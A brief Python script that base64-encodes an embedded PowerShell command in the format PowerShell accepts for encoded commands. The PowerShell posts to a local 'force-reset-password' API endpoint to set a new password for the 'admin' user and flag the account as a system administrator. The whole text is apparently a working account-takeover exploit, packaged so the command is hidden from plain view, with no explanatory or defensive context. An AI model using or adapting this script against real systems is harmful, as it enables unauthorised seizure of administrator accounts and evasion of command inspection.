import base64
ps = '''
$body = @{IsSysAdmin='true';OldPassword='whatever';Username='admin';NewPassword='P@ssw0rd123!@#';ConfirmPassword='P@ssw0rd123!@#'} | ConvertTo-Json
Invoke-RestMethod -Uri 'http://localhost:17017/api/v1/auth/force-reset-password' -Method Post -Body $body -ContentType 'application/json'
'''
print(base64.b64encode(ps.encode('utf-16-le')).decode())
